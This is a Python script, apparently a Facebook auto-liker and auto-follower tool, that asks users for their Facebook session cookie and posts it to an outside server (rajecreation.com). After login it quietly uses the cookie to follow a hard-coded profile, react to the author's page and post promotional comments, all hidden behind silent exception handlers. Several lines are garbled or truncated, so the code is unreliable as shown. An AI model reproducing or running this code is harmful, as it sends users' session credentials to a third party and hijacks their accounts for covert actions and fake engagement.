#BotolMehedi
#Thanks2RajeLiker

import requests,json,re,random,time,os,sys
from time import sleep
from bs4 import BeautifulSoup as bs
aa="\033[1;91m"
bb="\033[1;92m"
cc="\033[1;93m"
dd="\033[1;94m"
ee="\033[1;95m"
ff="\033[1;96m"
gg="\033[1;97m"
b="\033[1;91m"
c="\033[93m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{g}√{d}]{p}"
er=f"{d}[{r}!{d}]{p}"
pr=f"{d}[{c}?{d}]{p}"
mbasic="https://mbasic.facebook.com{}"


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def baner():
    clear()
    print(f"""
{bb}  
░█████╗░██████╗░██╗██████╗░
██╔══██╗██╔══██╗██║██╔══██╗
███████║██████╦╝██║██████╔╝
██╔══██║██╔══██╗██║██╔══██╗
██║░░██║██████╦╝██║██║░░██║
╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝                                
 \n {cc}Try somethings Different 
{dd}──────────────────────────────────────────────────
{gg}▸ AUTHOR     : Rayhan Ahmed Abir
▸ FACEBOOK   : FACEBOOK.COM/Abir.Official.Profile
▸ YOUTUBE    : YOUTUBE.COM/-----
▸ GITHUB     : GITHUB.COM/RayhanAhmedAbir
{dd}──────────────────────────────────────────────────""")

def agent():
lication/x-www-form-urlencoded; charset=utf-8","versioncode":"18","id":"QQ3A.200605.002","token":"3075dda32ffbbe88"}
    return ua

def useragent():
    try:
        usr=open("useragent").read()

> {c}")
  us:
        us.write(usr)
    return usr
    
###LoginMenu


    ua=agent()
    try:
d()
    except FileNotFoundError:
        cokie=input(f"{> {c}")
    data={"cookie":cokie,"access_token":"","loginType":"FB","refby":"null"}
    req=requests.post("https://rajecrearajeliker/v8/login.php",data=data,headers=ua).text
    if "Login success!" in req:
       with open("cookies","w") as ck:
            ck.write(datie"])
       try:
           lg=ses.get(mbasic.format("/me"),cookies={"cookie":cokie}).text
           lg=bs(lg,"html.parser").find("form",action=lambda x: "/intl/save_locale/?loc=id_ID" in x)
           dt=lg.find_all("input",type="hidden")
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           ses.post(mbasic.format(lg["action"]),data={"fb_dtsg":fg,"jazoest":jz},cookies={"cookie":cokie})
       except:
           pass
       try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies={"cookie":cokie}).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies={"cookie":cokie})
       except:
           pass
       try:
           rc=ses.get("https://mbasic.facebook.com/Abir.official.profile",cookies={"cookie":cokie}).text
           react=bs(rc,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies={"cookie":cokie}).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies={"cookie":cokie})
       except:
           pass
       try:
           kmn=ses.get("https://mbasic.facebook.com/abir.official.profile",cookies={"cookie":cokie}).text
           komen=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Nice Post by Abir-RAJE/ABIR-RAJE","Just Awesome by Abir-RAJE/ABIR-RAJE","Wow by ABIR-RAJE/ABIR-RAJE","Loved it by ABIR-RAJE/ABIR-RAJE","Wonderful by ABIR-RAJE/ABIR-RAJE"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies={"cookie":cokie})
       except:
           pass
       js=json.loads(req)
       return {"name":js["data"]["name"],"id":js["data"]["myid"],"cookie":js["data"]["cok"]}
    else:
       print(f"{er}Login Failed")
       try:
           os.system("rm cookies")
       except:
           pass
       os.system("python Araje.py")


###EarnPoint

def earn():
    ua=agent()
    data={"user_id":id,"type":"FB","code":cokie}
    req=requests.post/rajecreation.com/rajeliker/v8/earn.php",data=data,headers=ua).text
    if "Credit added success!" in req:
       res=requests.post("https://rajecreation.com/rajeliker/v8/timer.php",data={"user_id":id,"type":"FB"},headers={"user-agent":usa,"content-type":"application/x-www-form-urlencoded; charset=utf-8","accept-encoding":"gzip","host":"rajecreation.com"}).json()
       print(fve"]),end="")
       return res["active"]
    else:
       print(f"\r{er}Failed to earn credit")

###Follow

def follow(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"FOLLOW","cookie":cokie},headers=ua).text
    if "Data loaded success!" in req:
       js=json.loads(req)
       data={"limit":limit,"LoginType":"FB","type":"FOLLOW","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"}
       res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data=data,headers=ua).json()
       if res["data"]["count"] == 0:
          print(f"\r{er}Failed to add followers")
       else:
          nm=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("title").text
          print(f'\r{dn}Add followers to {c}{nm}')
          sleep(10)
          tot=ses.get(f'https://mbasic.facebook.com/timeline/app_collection/?collection_token={js["data"]["id"]}%3A184985071538002%3A32&_rdr',cookies={"cookie":cokie}).text
          total=re.findall(r'<td valign="...">Follower</td><td valign="..." class=".."><span class="(.*?)">(.*?)</span>',tot)[0][1]
          print(f"{pr}Total Followers : {c}{total}")
    else:
       print(f"\r{er}Profile not found")
       sleep(2)
       menu()

###Like


def like(url):
    ua=agent()
    limit=earn()
    req=requests.post("https://rajecreation.com/rajeliker/v8/checkURL.php",data={"url":url,"LoginWith":"FB","type":"LIKE","cookie":cokie},headers=ua).text
    if "Data loaded success!" in req:
        js=json.loads(req)
        res=requests.post("https://rajecreation.com/rajeliker/v8/send.php",data={"limit":limit,"LoginType":"FB","type":"LIKE","user_id":id,"post_id":js["data"]["id"],"cost":"1","cookie":cokie,"post_url":js["data"]["url"],"reaction":"1"},headers=ua).json()
        if res["data"]["count"] == 0:
           print(f"\r{er}Failed to add like")
        else:
           print(f'\r{dn}Like Added to {c}{js["data"]["url"]}')
           sleep(10)
           tot=bs(ses.get(js["data"]["url"],cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "/ufi/reaction/" in x)["href"]
           total=bs(ses.get(mbasic.format(tot),cookies={"cookie":cokie}).text,"html.parser").find("a",href=lambda x: "&reaction_type=1&" in x).find("span").text
           print(f"{pr}Total like : {c}{total}")
    else:
        print(f"\r{er}Post not found")
        sleep(2)
        menu()

def userinfo():
    print(f"{p}Login as : {c}{name}")
    print(f"{p}ID       : {c}{id}")
    print(f"{ab}-----------------------------------------------{d}")

###Menu

def menu():
    baner()
    userinfo()
    print(f"""{p}
{c}01{ab}. {p}Credit Earn
{c}02{ab}. {p}Auto Liker
{c}03{ab}. {p}Auto Follower
{c}00{ab}. {p}Exit Abir Tools
{ab}-----------------------------------------------{d}""")
    pilih_menu()

def pilih_menu():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       baner()
       sys.exit(f"{er}Don't forget to star my repository:)")
    elif choice == "01" or choice == "1":
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               earn()
               sleep(1)
           except:
               break
       print()
       input(f"{d}[{c} Press Enter To Back {d}]")
       os.system("python Araje.py")
    elif choice == "02" or choice == "2":
       pid=input(f"{er}Your Post Link \n{pr} {ab}>>> {c}")
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               like(pid)
               sleep(3)
           except:
               break
       print()
       input(f"{d}[ {c}Press Enter To Back {d}]")
       os.system("python Araje.py")
    elif choice == "03" or choice == "3":
       uid=input(f"{er}Profile Link \n{pr} {ab}>>> {c}")
       print(f"{er}Press {c}ctrl c {p}to stop")
       print(f"{ab}-----------------------------------------------{d}")
       while True:
           try:
               follow(uid)
               sleep(3)
           except:
               break
       print()
       input(f"{d}[ {c}Press Enter To Back {d}]")
       os.system("python Araje.py")
    else:
       print(f"{er}Choose the right one")
       pilih_menu()


if __name__=="__main__":
   baner()
   usa=useragent()
   ses=requests.Session()
   ses.headers.update({"user-agent":usa})
   try:
      masuk=login()
      cokie=masuk["cookie"]
      id=masuk["id"]
      name=masuk["name"]
      menu()
   except Exception as e:
      sys.exit(f"{er}{e}")
